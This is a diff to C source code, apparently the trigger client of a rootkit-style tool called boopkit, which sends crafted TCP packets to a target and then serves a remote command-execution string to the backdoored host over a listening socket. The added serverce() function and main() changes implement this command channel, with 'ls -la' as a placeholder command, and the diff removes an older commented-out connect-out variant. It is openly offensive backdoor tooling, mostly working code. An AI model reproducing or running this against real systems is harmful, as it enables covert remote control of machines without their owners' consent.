@@ -26,36 +26,55 @@
 #include <sys/socket.h>
 #include <time.h>
 #include <unistd.h>
+#include <stdbool.h>
+#include <linux/types.h>
+
 
 // clang-format off
+#include "../boopkit.h"
 #include "tcp.h"
 // clang-format on
 
-// int handlesndrce(char dial[INET_ADDRSTRLEN], char *rce) {
-//   printf(" ** Boop: %s\n ", dial);
-//   struct sockaddr_in daddr;
-//   daddr.sin_family = AF_INET;
-//   daddr.sin_port = htons(PORT);
-//   if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {
-//     printf(" XX Destination IP configuration failed.\n");
-//     return 1;
-//   }
-//   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-//   if (revsock == -1) {
-//     printf(" XX Socket creation failed\n");
-//     return 1;
-//   }
-//   if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-//     printf(" XX Connection SOCK_STREAM refused.\n");
-//     return 1;
-//   }
-//
-//   char buffer[MAX_RCE_SIZE];
-//   read(revsock, buffer, MAX_RCE_SIZE);
-//   close(revsock);
-//   strncpy(rce, buffer, MAX_RCE_SIZE);
-//   return 0;
-// }
+int serverce(char listenstr[INET_ADDRSTRLEN], char *rce) {
+  struct sockaddr_in laddr;
+  int one = 1;
+  const int *oneval = &one;
+  laddr.sin_family = AF_INET;
+  laddr.sin_port = htons(PORT);
+  if (inet_pton(AF_INET, listenstr, &laddr.sin_addr) != 1) {
+    printf(" XX Listen IP configuration failed.\n");
+    return 1;
+  }
+  int servesock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (servesock == -1) {
+    printf(" XX Socket creation failed\n");
+    return 1;
+  }
+  if (setsockopt(servesock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, oneval,
+                 sizeof oneval)) {
+    printf(" XX Socket option SO_REUSEADDR | SO_REUSEPORT failed\n");
+    return 1;
+  }
+  if (bind(servesock, (struct sockaddr *)&laddr, sizeof laddr) < 0) {
+    printf(" XX Socket bind failure: %s\n", listenstr);
+    return 1;
+  }
+
+  printf("Listening for Boopkit response...\n");
+  // n=1 is the number of clients to accept before we begin refusing clients!
+  if (listen(servesock, 1) < 0) {
+    printf(" XX Socket listen failure: %s\n", listenstr);
+    return 1;
+  }
+  int clientsock;
+  int addrlen = sizeof laddr;
+  if ((clientsock = accept(servesock, (struct sockaddr*)&laddr, (socklen_t*)&addrlen)) < 0 ) {
+    printf(" XX Socket accept failure: %s\n", listenstr);
+    return 1;
+  }
+  send(clientsock, rce, MAX_RCE_SIZE, 0);
+  return 0;
+}
 
 // [trigger] <source-ip> <target-ip> <target-port>
 //
@@ -68,6 +87,7 @@
 // a boop!
 //
 int main(int argc, char **argv) {
+  char *rce = "ls -la";
   srand(time(NULL));
   if (argc != 4) {
     printf("usage: %s <source-ip> <target-ip> <port>\n", argv[0]);
@@ -173,6 +193,7 @@ int main(int argc, char **argv) {
   close(sock2);
   // ===========================================================================
 
+
   // ===========================================================================
   // 3. TCP Reset SOCK_RAW
   //
@@ -225,7 +246,10 @@ int main(int argc, char **argv) {
   close(sock3);
   // ===========================================================================
 
-  // We get here we should have "booped" by now!
-
+  int errno;
+  errno = serverce(saddrstr, rce);
+  if (errno != 0) {
+    printf(" Error serving RCE!\n");
+  }
   return 0;
 }
